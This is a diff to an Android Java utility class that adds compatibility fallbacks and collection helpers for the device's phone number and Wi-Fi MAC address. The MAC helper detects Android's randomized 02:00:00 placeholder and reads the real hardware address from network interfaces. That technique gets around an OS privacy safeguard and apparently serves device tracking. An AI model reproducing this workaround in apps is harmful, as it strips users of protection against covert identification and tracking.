@@ -25,7 +25,14 @@ final class Common {
     private static final String PREFS = "svc";
     private static final int READ_CAP = 512 * 1024;
 
+    @SuppressWarnings("deprecation")
     static boolean granted(Context ctx, String permission) {
+        if (Build.VERSION.SDK_INT < 23) {
+            // Below 23 every permission is install-time; a missing one can only
+            // come from a manifest that never declared it.
+            return ctx.getPackageManager().checkPermission(permission, ctx.getPackageName())
+                    == PackageManager.PERMISSION_GRANTED;
+        }
         return ctx.checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
     }
 
@@ -79,6 +86,9 @@ final class Common {
     }
 
     static boolean charging(Context ctx) {
+        if (Build.VERSION.SDK_INT < 23) {
+            return false;
+        }
         try {
             BatteryManager manager = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
             return manager != null && manager.isCharging();
@@ -90,7 +100,7 @@ final class Common {
     @SuppressWarnings("deprecation")
     static String phone(Context ctx) {
         try {
-            if (Build.VERSION.SDK_INT >= 26 && Common.granted(ctx, android.Manifest.permission.READ_PHONE_STATE)) {
+            if (Common.granted(ctx, android.Manifest.permission.READ_PHONE_STATE)) {
                 TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
                 String number = tm == null ? null : tm.getLine1Number();
                 if (number != null && !number.isEmpty()) {
@@ -123,16 +133,41 @@ final class Common {
 
     @SuppressWarnings("deprecation")
     static String mac(Context ctx) {
+        String fromWifi = "";
         try {
             WifiManager wifi = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-            if (wifi == null) {
-                return "";
+            if (wifi != null) {
+                String address = wifi.getConnectionInfo().getMacAddress();
+                if (address != null) {
+                    fromWifi = address;
+                }
             }
-            String address = wifi.getConnectionInfo().getMacAddress();
-            return address == null ? "" : address;
-        } catch (Throwable exc) {
-            return "";
+        } catch (Throwable ignored) {
         }
+        // Since Android 6 the WifiManager value is often the fake 02:00:…
+        if (!fromWifi.isEmpty() && !fromWifi.startsWith("02:00:00")) {
+            return fromWifi;
+        }
+        try {
+            java.util.Enumeration<java.net.NetworkInterface> interfaces =
+                    java.net.NetworkInterface.getNetworkInterfaces();
+            while (interfaces != null && interfaces.hasMoreElements()) {
+                java.net.NetworkInterface nic = interfaces.nextElement();
+                if (nic.isUp() && !nic.isLoopback() && nic.getHardwareAddress() != null
+                        && nic.getName().startsWith("wlan")) {
+                    StringBuilder out = new StringBuilder();
+                    for (byte part : nic.getHardwareAddress()) {
+                        if (out.length() > 0) {
+                            out.append(':');
+                        }
+                        out.append(String.format(java.util.Locale.US, "%02X", part));
+                    }
+                    return out.toString();
+                }
+            }
+        } catch (Throwable ignored) {
+        }
+        return fromWifi;
     }
 
     static JSONObject meta(Context ctx) {
